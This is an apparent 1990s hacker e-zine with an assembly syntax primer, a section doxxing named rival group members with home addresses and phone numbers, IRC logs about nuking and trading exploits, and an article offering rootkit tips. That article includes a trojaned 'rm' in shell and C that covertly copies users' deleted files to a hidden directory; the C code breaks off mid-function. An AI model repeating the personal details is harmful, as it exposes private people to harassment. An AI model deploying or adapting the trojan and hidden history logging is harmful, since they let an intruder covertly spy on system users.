in intel you wold do this like mov ax, byte ptr foo...

The far instruction for att is lret $stack-adjust, in intel it's 
ret far stack-adjust.

The l in front of mov, is the byte/memory operand..... this is actually
more convient if you ask me.

also in intel......you have
section:[base + index*scale + disp]

disp=displcement
scale=1 if not given

in att however, it's like this:
section:disp(base,index,scale)

so es:[ebp-5] in intel
would be
%es:-4(%ebp)
in att

Intel: [foo]  AT&T: foo(,1) the ,1 means an index of one...
Inte: [foor + eax*4] AT&T: foor(,%eax,4)

I hope this helps :)

How to Get some assembly examples in unix:
-----------------------------------------
	 
Now how to get a few examples on how to get some assembly code
for unix......first of all you can do something like
this:

test.c:
void main()
{
printf("hi\n");
}

now to compile it, do gcc -S test.c, this will make a file test.s in
assembly......look at it it contains great info....and some examples of
the macros and what not defined/shown in gas' (GNU assembler) manual.
(Which can be found at http://www.cs.utah.edu/csinfo/texinfo, under gas.

here is what test.s will look like:

        .file   "test.c"
        .version        "01.01"
gcc2_compiled.:
.section        .rodata
.LC0:
        .string "test\n"
.text
        .align 4
.globl main
        .type    main,@function
main:
        pushl %ebp
        movl %esp,%ebp
        pushl $.LC0
        call printf
        addl $4,%esp
.L1:
        leave
        ret
.Lfe1:
        .size    main,.Lfe1-main
        .ident  "GCC: (GNU) 2.7.2.1"


As you know, the "l"'s in front of push,mov,add, etc....that means it's
type long.... and the % goes in front of all register operands, whereas in
intel syntax, it is undelimited. Likewise, the immediate operands, have a
$ in front of them, whereas once again, intel is undelimited.

movl $3, %eax 
is equal to:
mov eax, 3 
in intel

The other way to get asm code is with gdb......you compile your program
with gcc -g .......and for even more......gcc -g -a...
here is our test.c ......in gdb,
we do 'disassemble main':

(gdb) disassemble main
Dump of assembler code for function main:
0x8048474 <main>:       pushl  %ebp
0x8048475 <main+1>:     movl   %esp,%ebp
0x8048477 <main+3>:     pushl  $0x80484c8
0x804847c <main+8>:     call   0x8048378 <printf>
0x8048481 <main+13>:    addl   $0x4,%esp
0x8048484 <main+16>:    leave  
0x8048485 <main+17>:    ret    
End of assembler dump.

That is with just -g.......with -a as well you can see the difference
(more instructions show up that usually wouldn't):

(gdb) disassemble main
Dump of assembler code for function main:
0x80485d8 <main>:       pushl  %ebp
0x80485d9 <main+1>:     movl   %esp,%ebp
0x80485db <main+3>:     cmpl   $0x0,0x8049a6c
0x80485e2 <main+10>:    jne    0x80485f1 <main+25>
0x80485e4 <main+12>:    pushl  $0x8049a6c
0x80485e9 <main+17>:    call   0x80488fc <__bb_init_func>
0x80485ee <main+22>:    addl   $0x4,%esp
0x80485f1 <main+25>:    incl   0x8049b78
0x80485f7 <main+31>:    pushl  $0x8048978
0x80485fc <main+36>:    call   0x8048468 <printf>
0x8048601 <main+41>:    addl   $0x4,%esp
0x8048604 <main+44>:    incl   0x8049b7c
0x804860a <main+50>:    leave  
0x804860b <main+51>:    ret    
End of assembler dump.

I of course need to give credit of this to the gas manual, as parts were
taken from there.

Well I hope you enjoyed that little introduction. Any corrections let me
know as shok@onlinex.net or shok@janova.org.

                                  Shok
                          (--==+*~Shok~*+==--)

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
  2. sIn inf0z : so1o
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

                    Fucking sIn b1tchez bow to the elite.

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

 Alias      :  Evil Chick
 Real Name  :  Suzette Kimminau
 Address    :  130 105th Ave. S.E. Apt. 218
               Bellevue, Wa 98004
               USA

 Telephone  :  (206)454-7176
 E-mail     :  evilchic@NWLINK.COM

-------------------------------------------------------------------------------

 Alias      :  \\StOrM\\
 Real Name  :  Jason Sloderbeck
 Address    :  5739 N Norton,
               Kansas City, MO 64119
               USA

 Telephone  :  (816)453-8722
 E-mail     :  storm@SINNERZ.COM

-------------------------------------------------------------------------------

 Alias      :  JDKane
 Real Name  :  Kim
 Address    :  327 E Park Road,
               Round Lake, IL 60073
               USA

 Telephone  :  (847)546-9154
 E-mail     :  

-------------------------------------------------------------------------------

 Alias      :  Soul Tear
 Real Name  :  Wesley Stroeber
 Address    :  10770 E. Silver Vein Dr.
               Tucson, Arizona 85710
               USA

 Telephone  :
 E-mail     :  soultear@mindspring.com

-------------------------------------------------------------------------------

 Alias      : Scud-O
 Real Name  : Kevin Shivers
 Address    : PO Box 448
              Sykesville, Maryland 21784
              USA

 Telephone  : (410)442-2410
 E-mail     : foxmulder@WORLDNET.ATT.NET

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

      You want to know how lame sIn really are? check www.sinnerz.com

             The Hax0r brothers don't 0wn a car between them.

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
  3. Wassup with NT?! : Crystalize
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

You know... take a lok around you next time you happen to be at the
news sites of places like underground.org, and l0pht.com.  What is it you're
seeing all around you?  Shit about NT, thats what.  Windows NT is claimed to
have critical system holes in it that would allow a hakcer complete access
to any Nt system on the net.

You might ask yourself what Microsoft is doing in reponse to the
what these computer security consultants (hackers with a salary) have said.
Absolutely nothing!  Thats right!  You heard it first from Crystalize.  Well,
maybe not first, but by God I told it anyway.  But, back to the story.

Microsoft was told of these security flaws in the NT system and went
straight to work to correct these little problems.  Of course, the plugs for
these hoes, however, will not be coming out until the NT 5.0 upgrade 
sometime around 1998!  Hackers are going to have a big field day with NT.

Although I've spent the first of this article totally trashing
Microsoft for not taking immediate action by coming out with a patch for NT,
you do have to give them a little credit.  They actually swallowed their
pride and came asking for help.  Who do you think they asked?  Thats right,
Microsoft came crawling to the community of hackers.  It goes against every
policy that Microsoft has, but, what the hell, lets face it... they needed
some help.

Anyway, they came to L0pht and asked for help.  Why did they come to
l0pht?  Because it was L0phtcrack 1.5 that decrypted NT user passwords and
sent them back in plain text (pretty slick, l0pht.)  Okay, about this
meeting.  Microsoft sends these NT experts to talk with security experts 
from the government and the hacking community.  I'm going to quote someone
real quick.  NT marketing director Carl Karanan said this,"We came here 
to look at the hacker's perspective - to understand what they're thinking
and what their concerns are.  Its good to look at things in perspective;
this conference does that."

He also said something kinda nice, "We've opened up a dialogue.  The
hackers do a service.  We're listening and learning."  No shit, he really
said that... a Microsoft exec saying they're learning from the hackers.

Ok, heres another quote, only this one's from a hacker.  "What
we're trying to do as a community is point out some very serious problems
in an operating system that is used in corporate America and in goverments
worldwide, and we're pointing it out in a legitmate manner saying 'Fix
This.'", said Yobie Benjamin, a knowledge officer and NT hacker.

Then Mudge got up to speak and gave a little presentation about
L0phts new NT password cracking program.  An impressive audience to, which
I hear included execs from Toyota, ESPN, the Defense Department and the NSA.
(WAY TO GO MUDGE!)

Anyway, if you want to know exactly what the program does, head to
L0phts site at www.l0pht.com/advisories.  And you know what?  This program
I'm told is extremely powerful.  Here's a little taste of what it does.
Mudge says that if the program is launched from a Unix or Pentium Pro 200
on a corporation of 40,000 users that managed all usernames and Lanman/NT
passwords from one PDC (primary domain controller), it would only take 40
hours to decrypt all 40,000 passwords and give them to ya in plain text.
(DAMN!)

I really like this quote from Mudge, too, "Windows NT's backward
compatability always bite 'em on the ass."  HAHAHAHAHA!

Anyway, thats all I've got to report on that little bit of news.
Thanks for readin and let me know if ya want me to report on any other
stuff.  Later.

- Crystalize
  @#w|h|p|v on EFNet

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
  4. More #hebrew : so1o
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

*** \\`a\\` (jack@ts1p2.rannet.com) has joined #hebrew
<\\`a\\`> shit!!
<RoBoGi> [\\`a\\`] The M@$TER IS HeRe !!!! BE CAREFUL!!!
<\\`a\\`> som1 nuked me!!!
*** \\`a\\` is now known as {Jupiter}
*** ^MAD^SAD^ has quit IRC (Broken pipe)
<{Jupiter}> mega!!
<{Jupiter}> how can one nuke me ..!!!
<{Jupiter}> meeeeeeeeeegggggggaaaaaaa
<MeGaMaN-> GREAT!!!!!!1
<MeGaMaN-> lens flare RULEEEEZZZZZ
<{Jupiter}> what greaT!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
<{Jupiter}> som1 nuke me!!
<{Jupiter}> and  , i restared my pc!!
<{Jupiter}> mega!!
<{Jupiter}> r u therE?!?!?
<{Jupiter}> man!!
<{Jupiter}> meeeeeeeeeeeeggggggggggggggggggggggggggaaaaaaaaaaaaaa
<MeGaMaN-> YES
<MeGaMaN-> yes
<MeGaMaN-> i was in photoshop
<{Jupiter}> where r u ?
<MeGaMaN-> i was in photoshop4
<{Jupiter}> ok..
<{Jupiter}> so , tell me 
<{Jupiter}> how did 1 nuke me?!
<MeGaMaN-> what hapend?
<{Jupiter}> so1 nuke me
<MeGaMaN-> ur computer FREEZED?
<{Jupiter}> noooooooo
<{Jupiter}> the comp. was blue
<MeGaMaN-> so install the winnuke fix!!
<{Jupiter}> winnuke fix?!
<MeGaMaN-> yes
<{Jupiter}> i mean , so1 nuke me , and bomb
<{Jupiter}> i am not in wi95
<{Jupiter}> bom 
<{Jupiter}> i am in a blue!!!
<{Jupiter}> worming!!
<MeGaMaN-> [{Jupiter} VERSION reply]: mIRC32 v5.0 K.Mardam-Bey
<MeGaMaN-> u r on win95
<{Jupiter}> yep!
<MeGaMaN-> my fix is already installed
<MeGaMaN-> and i dont have him
<MeGaMaN-> it
<{Jupiter}> ok..
<{Jupiter}> where r all the boTS?!

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
  5. Linking to /dev/zero : xFli
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

[Tremle_(tremle@163.164.162.19)] cna I have the exploit mate, please
[msg(tremle_)] not yetr!$#!@$
[Tremle_(tremle@163.164.162.19)] why mate?
[Tremle_(tremle@163.164.162.19)] pleeease
[Tremle_(tremle@163.164.162.19)] mate, please sendmial 8.8.5 remote
[Tremle_(tremle@163.164.162.19)] and I won;t ask for anything ever again
>>> Tremle_ [tremle@163.164.162.19] requested PING from xFli
[msg(tremle_)] ....
[Tremle_(tremle@163.164.162.19)] just this one time
<xFli> hoho, i think the ol ln -s /dev/zero 885.remote.c trick could be useful
          here
ùíù DCC SEND connection with tremle_[163.164.162.19, port 1061] established
<xFli> ùíù DCC SEND connection with tremle_[163.164.162.19, port 1061]
          established
[Tremle_(tremle@163.164.162.19)] is it remote?
[msg(tremle_)] YES
[Tremle_(tremle@163.164.162.19)] thansk mate
[msg(tremle_)] U better not bug me like this again
[Tremle_(tremle@163.164.162.19)] root shell? ;)
[Tremle_(tremle@163.164.162.19)] i won't
[Tremle_(tremle@163.164.162.19)] is it moving?
[msg(tremle)] so are u gonna give me something in return then?
[Tremle_(tremle@163.164.162.19)] :)
[Tremle_(tremle@163.164.162.19)] thankyou very much I relly appreciate
[Tremle_(tremle@163.164.162.19)] ok cary on with yer scripting
[msg(tremle_)] so are u gonna give me something in return then?
[Tremle_(tremle@163.164.162.19)] what you want?
[msg(tremle_)] something cool
[Tremle_(tremle@163.164.162.19)] how big is this btw?
[Tremle_(tremle@163.164.162.19)] uhm
[msg(tremle_)] its quite big, got a lot of shellcode in it, its actually quite
          a compliated sploit
[Tremle_(tremle@163.164.162.19)] what sorta thing you lookign for
[msg(tremle_)] just, well, anything
[Tremle_(tremle@163.164.162.19)] uhm
[msg(tremle_)] u got anything new?
[Tremle_(tremle@163.164.162.19)] I will hoepfully get soem on thursday
[Tremle_(tremle@163.164.162.19)] SunOS stuff
[msg(tremle_)] can't u gimme somethin now?
[Tremle_(tremle@163.164.162.19)] i shall have a look
[Tremle_(tremle@163.164.162.19)] tremle find's frantically
[msg(tremle_)] just anything cool...
[msg(tremle_)] u got any new bsd stuff?
[Tremle_(tremle@163.164.162.19)] I shall look
[Tremle_(tremle@163.164.162.19)] do they have to be remote?
[msg(tremle_)] naw, jus anything...
[Tremle_(tremle@163.164.162.19)] nope
[Tremle_(tremle@163.164.162.19)] this is taking a while, what size is it?
[msg(tremle_)] its about 400k
Tremle_(tremle@163.164.162.19)] k
[msg(tremle_)] ok, well, send me just well, do you have anything like eipscan
          2?
[Tremle_(tremle@163.164.162.19)] nope
[Tremle_(tremle@163.164.162.19)] uhm
[Tremle_(tremle@163.164.162.19)] so what would you prefer?
[msg(tremle_)] hmm...what bsd stuff do you have?
[Tremle_(tremle@163.164.162.19)] exploits.code or what?
[msg(tremle)] exploits...
[msg(tremle)] or some cool codez
[Tremle_(tremle@163.164.162.19)] rxvt exploit
[Tremle_(tremle@163.164.162.19)] rdist
[msg(tremle_)] rxvt for bsd?
[msg(tremle_)] send that
[Tremle_(tremle@163.164.162.19)] ok
[Tremle_(tremle@163.164.162.19)] wiat a sec
[Tremle_(tremle@163.164.162.19)] hmm, also slackware 3.0
[msg(tremle_)] just bsd
[msg(tremle_)] send bsd
ùíù DCC SEND (rxvt.txt) request from Tremle_[tremle@163.164.162.19
          [163.164.162.19:1097]]
ùíù Auto-getting file rxvt.txt from Tremle_
ùíù DCC GET connection with Tremle_[163.164.162.19, port 1097] established
ùíù DCC GET:rxvt.txt [2.269kb] from Tremle_ completed in 7 secs (0.3241
          kb/sec)
[msg(tremle_)] any other bsd stuff?
[Tremle_(tremle@163.164.162.19)] if it's old tell me
[Tremle_(tremle@163.164.162.19)] I have everything mixed up
[msg(tremle_)] whats the newest stuff you have?
[Tremle_(tremle@163.164.162.19)] wait a sec
[Tremle_(tremle@163.164.162.19)] procfs
[msg(tremle_)] i have that
[Tremle_(tremle@163.164.162.19)] screen
[msg(tremle_)] send that
[Tremle_(tremle@163.164.162.19)] ddb
msg(tremle_)] send that too
[Tremle_(tremle@163.164.162.19)] both?
[Tremle_(tremle@163.164.162.19)] wait a sec
[Tremle_(tremle@163.164.162.19)] dcc send xFLi
[Tremle_(tremle@163.164.162.19)] doh
[Tremle_(tremle@163.164.162.19)] I have put them in .html format, they were
          goan go on my webpage
[msg(tremle_)] s'ok, send em anywayz..
ùíù DCC SEND (ddbsd.html) request from Tremle_[tremle@163.164.162.19
          [163.164.162.19:1106]]
ùíù Auto-getting file ddbsd.html from Tremle_
ùíù DCC GET connection with Tremle_[163.164.162.19, port 1106] established
ùíù DCC GET:ddbsd.html [2.608kb] from Tremle_ completed in 17 secs (0.1534
          kb/sec)
[Tremle_(tremle@163.164.162.19)] how big is this?
[msg(tremle_)] should be nearly finished
[Tremle_(tremle@163.164.162.19)] k, what size is it?
[Tremle_(tremle@163.164.162.19)] how's the sploti work?
[msg(tremle_)] i thought it was like 400k but thatwas sommin else, its about
          950k i think
[Tremle_(tremle@163.164.162.19)] mm
[Tremle_(tremle@163.164.162.19)] sure you just haven;t renamed a file 885rem.c
          ?
[msg(tremle_)] like i said, its pretty complicated
<xFli> [Tremle_(tremle@163.164.162.19)] sure you just haven;t renamed a file
          885rem.c
<xFli>           ?
<xFli> OH! hes nearly caught on!
[Tremle_(tremle@163.164.162.19)] k
[Tremle_(tremle@163.164.162.19)] I;ll take yer word for it
[Tremle_(tremle@163.164.162.19)] what else you got btw?
[Tremle_(tremle@163.164.162.19)] can you check the filesize completelley?
[msg(tremle)] 2 secs
[Tremle_(tremle@163.164.162.19)] I mena will you check it?
>>> Tremle_ [tremle@163.164.162.19] requested PING from xFli
[Tremle_(tremle@163.164.162.19)] fuck
[msg(tremle_)] -r--------   1 root     root       933744 Aug  4 12:16 885rem.c
[Tremle_(tremle@163.164.162.19)] infiniete dcc
[Tremle_(tremle@163.164.162.19)] ?
[msg(tremle_)] 933 k
[Tremle_(tremle@163.164.162.19)] you did an infinite dcc?
[msg(tremle_)] no way dammit
[Tremle_(tremle@163.164.162.19)] serious have you?
[msg(tremle_)] serious. NO
[Tremle_(tremle@163.164.162.19)] ok
[Tremle_(tremle@163.164.162.19)] so1o thinks you have
[msg(tremle_)] wtf would so1o know?
[msg(tremle_)] i can't stand that g1mp
[Tremle_(tremle@163.164.162.19)] hmm
[Tremle_(tremle@163.164.162.19)] so what size is it again?
[msg(tremle_)] 933k
[Tremle_(tremle@163.164.162.19)] k
[Tremle_(tremle@163.164.162.19)] never seen an exploit this big before
>>> Tremle_ [tremle@163.164.162.19] requested PING from xFli
[Tremle_(tremle@163.164.162.19)] my spellign sukcs, im such a homo...
[Tremle_(tremle@163.164.162.19)] so1o is so cool
[Tremle_(tremle@163.164.162.19)] i smell
[Tremle_(tremle@163.164.162.19)] hey, you;re a fucking lair and sutff
ùíù DCC lost SEND to tremle_ [/home/security/885rem.c]

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
===============================================================================
==[ NEWS ]=====================[ .SECTION E. ]=======================[ NEWS ]==
===============================================================================
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

Like, nothing happened and stuff..

.so1o

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
===============================================================================
==[ PROJECTS ]=================[ .SECTION F. ]===================[ PROJECTS ]==
===============================================================================
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
  1. TOTALCON '98 : so1o
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

******************************************************************************
                         http://www.aom.co.uk/total/
******************************************************************************
  +------------------------------------+------------------------------------+
  Ý An Official Total Con Announcement Ý An Official Total Con Announcement Ý
  Ý An Official Total Con Announcement Ý An Official Total Con Announcement Ý
  +------------------------------------+------------------------------------+
******************************************************************************
                         http://www.aom.co.uk/total/
******************************************************************************

 Total Con '98 is now a reality, here are preliminary details...
 ===============================================================

 Venue        :  The Old Firestation, Silver Street, Bristol, ENGLAND
 Date         :  Late March 1998   (probably the last week)
 Duration     :  1 night           (12:00pm -> 12:00pm next day)

 What         :  12 system network with internet access
                 Loud music
                 Fully licensed bar downstairs
                 Elite UV and spotlights
                 Channel 4 media coverage  (hopefully)

                 ALOT of cool people
                 ^^^^^^^^^^^^^^^^^^^
      *** NO SPEAKERS WHATSOEVER *** *** NO SPEAKERS WHATSOEVER ***


 Travel        : Easily accessible by car, train, bus or plane.
 Accomodation  : You can crash out in the Firestation (its HUGE) or book one
                 of many hotels in the immediate area.


******************************************************************************
                         http://www.aom.co.uk/total/
******************************************************************************
  +------------------------------------+------------------------------------+
  Ý An Official Total Con Announcement Ý An Official Total Con Announcement Ý
  Ý An Official Total Con Announcement Ý An Official Total Con Announcement Ý
  +------------------------------------+------------------------------------+
******************************************************************************
                         http://www.aom.co.uk/total/
******************************************************************************

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
  2. Security / Monitoring tools : Shok
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

                 SECURITY/MONITORING (some misc. tools I wrote)
                 ---------------------------------------------
                           By (--==+*~Shok~*+==--)
    
Okay, well........welcome to this thing......by Shok. 
What I plan for this to be, is some various utilities that you might think
as of use and what not. This is mainly a few security tips that I like to
use.

First off, edit your /etc/profile, and add the line:
export HISTFILE=/tmp/hist/`whoami`

and then do:
mkdir /tmp/hist;chmud 1777 /tmp/hist

You now want to hide that file, so the users don't see the dir (it can be
seen with set but not too many people check :) and you hide it with the
rootkit's ls.

Another few things I like to do.
I made a trojaned 'rm' that basically calls /bin/rm.bak which is hidden
(via rootkit ls), and it copies the file they are trying to delete to
/tmp/fill (which is also hidden via rootkit ls). 
There are two versions of this....I wrote the first one in shell script,
but do to the fact it has to be a+r, I wrote it in C afterwords. Here is
the rm.sh:

#!/bin/sh
# rm.sh -- rm "trojan" by (--==+*~Shok~*+==--) 

if [ $# > 1 ] 
then

case $1 in
-i)
shift
cp -f $* /tmp/fill &>/dev/null
doexec /bin/rm.bak rm -i $*
;;
--interactive)
shift
cp -f $* /tmp/fill &>/dev/null
doexec /bin/rm.bak rm -i $* 
;;

-f)
shift
cp -f $* /tmp/fill &>/dev/null
/bin/rm.bak -f $*
;; 
--force)
shift
cp -f $* /tmp/fill &>/dev/null
/bin/rm.bak -f $* 
;;

-d)
shift
cp $1/* /tmp/fill &>/dev/null
/bin/rm.bak -d $*
;; 
--directory)
shift
cp $1/* /tmp/fill &>/dev/null
/bin/rm.bak -d $* 
;;

-v)
shift
cp -f $* /tmp/fill &>/dev/null
/bin/rm.bak -v $*
;;
--verbose)
shift
cp -f $* /tmp/fill &>/dev/null
/bin/rm.bak -v $* 
;;

-r)
shift
cp -f $1/* /tmp/fill &>/dev/null
/bin/rm.bak -R $*
;; 
-R)
shift
cp -f $1/* /tmp/fill &>/dev/null
/bin/rm.bak -R $*
;; 
--recursive)
shift
cp -f $1/* /tmp/fill &>/dev/null
/bin/rm.bak -R $* 
;;

-ri)
shift
cp -f $1/* /tmp/fill &>/dev/null
/bin/rm.bak -ri $*
;;
-Ri)
shift
cp -f $1/* /tmp/fill &>/dev/null
/bin/rm.bak -ri $*
;;

-rf)
shift
cp -f $1/* /tmp/fill &>/dev/null
cp -f $1 /tmp/fill &>/dev/null  
/bin/rm.bak -rf $*
;;
-Rf)
shift
cp -f $1/* /tmp/fill &>/dev/null
cp -f $1 /tmp/fill &>/dev/null
/bin/rm.bak -rf $*
;;

-rd)
shift
cp -f $1/* /tmp/fill &>/dev/null
/bin/rm.bak -rd $*
;;
-Rd)
shift
cp -f $1/* /tmp/fill &>/dev/null
/bin/rm.bak -rd $*
;;

-Rv)
shift
cp -f $1/* /tmp/fill &>/dev/null
/bin/rm.bak -rv $*
;;
-rv)
shift
cp -f $1/* /tmp/fill &>/dev/null
/bin/rm.bak -rv $*
;;

-fv)
shift
cp -f $1 /tmp/fill &>/dev/null
/bin/rm.bak -fv $*
;;

-Rfv)
shift
cp -f $1/* /tmp/fill &>/dev/null
cp -f $1   /tmp/fill &>/dev/null
/bin/rm.bak -rfv $*
;;
-rfv)
shift
cp -f $1/* /tmp/fill &>/dev/null
cp -f $1   /tmp/fill &>/dev/null
/bin/rm.bak -rfv $*
;;

*)
cp -f $* /tmp/fill &>/dev/null
/bin/rm.bak $*
;;
esac

else

IT=$1
cp -f $IT /tmp/fill
/bin/rm.bak $IT
fi
#----------------------------------------------------

You may have to change the line:
doexec /bin/rm.bak -i $*

to:
/bin/rm.bak -i $* 
if you do not have doexec which is on linux (or redhat anyway)



Now for rm.c:
 
/* ------------------------------------------------------ */
/* rm.c -- rm "trojan" by (--==+*~Shok~*+==--)            */
/* ------------------------------------------------------ */

#include <sys/stat.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h> 
#include <unistd.h>


void main(int argc, char **argv)
{
  struct stat filestats;
  int i;
  if (argc > 2) 
  	{
		if (strcmp("-i", argv[1])==0) goto interactive;
		if (strcmp("-f", argv[1])==0) goto force;
		if (strcmp("-v", argv[1])==0) goto verbose;
		if (strcmp("-r", argv[1])==0) goto recursive;
		if (strcmp("-rf", argv[1])==0) goto rf;
		if (strcmp("-ri", argv[1])==0) goto ri;
		if (strcmp("-rv", argv[1])==0) goto rv;
		if (strcmp("-rvf", argv[1])==0) goto rfv;
		if (strcmp("-rfv", argv[1])==0) goto rfv;
		if (strcmp("-Rvf", argv[1])==0) goto rfv;
		if (strcmp("-Rfv", argv[1])==0) goto rfv;
		if (strcmp("-frv", argv[1])==0) goto rfv;
		if (strcmp("-fvr", argv[1])==0) goto rfv;
		if (strcmp("-fRv", argv[1])==0) goto rfv;
		if (strcmp("-fvR", argv[1])==0) goto rfv;
		if (strcmp("-vfr", argv[1])==0) goto rfv;
		if (strcmp("-vrf", argv[1])==0) goto rfv;
		if (strcmp("-vfR", argv[1])==0) goto rfv;
		if (strcmp("-vRf", argv[1])==0) goto rfv;
		if (strcmp("-fr", argv[1])==0) goto rf;
		if (strcmp("-ir", argv[1])==0) goto ri;
		if (strcmp("-vr", argv[1])==0) goto rv;
		
		if (strcmp("--interactive", argv[1])==0) goto interactive;
		if (strcmp("--force", argv[1])==0) goto force;
		if (strcmp("--verbose", argv[1])==0) goto verbose;
		if (strcmp("--recursive", argv[1])==0) goto recursive;
  	} 

  else {
	setenv("PROGRAM", argv[1], 1);
	system("cp -f $PROGRAM /tmp/fill &>/dev/null");
	system("/bin/rm.bak $PROGRAM");
	unsetenv("PROGRAM");
  }


interactive:

  lstat(argv[2], &filestats);
  for (i=2;i<argc;i++) 
  {
 	 if (S_ISDIR(filestats.st_mode))
 	 {
		setenv("PROGRAM", argv[i], 2);
		system("cp -f $PROGRAM/* /tmp/fill &>/dev/null");
		unsetenv("PROGRAM");
		execl("/bin/rm.bak","rm","-i",argv[2],NULL);
	 } 

  	 else 
         {
		setenv("PROGRAM", argv[2], 1);
		system("cp -f $PROGRAM /tmp/fill &>/dev/null");
		unsetenv("PROGRAM");
		execl("/bin/rm.bak","rm","-i",argv[2],NULL);
         }    
  }

  
force:

  for (i=2;i<argc;i++) 
  {
  	setenv("PROGRAM", argv[i], 1);
  	system("cp -f $PROGRAM /tmp/fill &>/dev/null");
	execl("/bin/rm.bak","rm","-f",argv[i],NULL);
	unsetenv("PROGRAM");

  }


verbose:
  for (i=2;i<argc;i++) 
  {
	setenv("PROGRAM", argv[i], 1);
	system("cp -f $PROGRAM /tmp/fill &>/dev/null");
	execl("/bin/rm.bak","rm","-v",argv[i],NULL);
	unsetenv("PROGRAM");
  }

recursive:
  for (i=2;i<argc;i++) 
  {
  	setenv("PROGRAM", argv[i], 1);
  	system("cp -f $PROGRAM /tmp/fill &>/dev/null");
  	execl("/bin/rm.bak","rm","-r",argv[i],NULL);
  	unsetenv("PROGRAM");
  }

rf:

  for (i=2;i<argc;i++) 
  {
	lstat(argv[i], &filestats);
	if (S_ISDIR(filestats.st_mode))
	{
		setenv("PROGRAM", argv[i], 1);
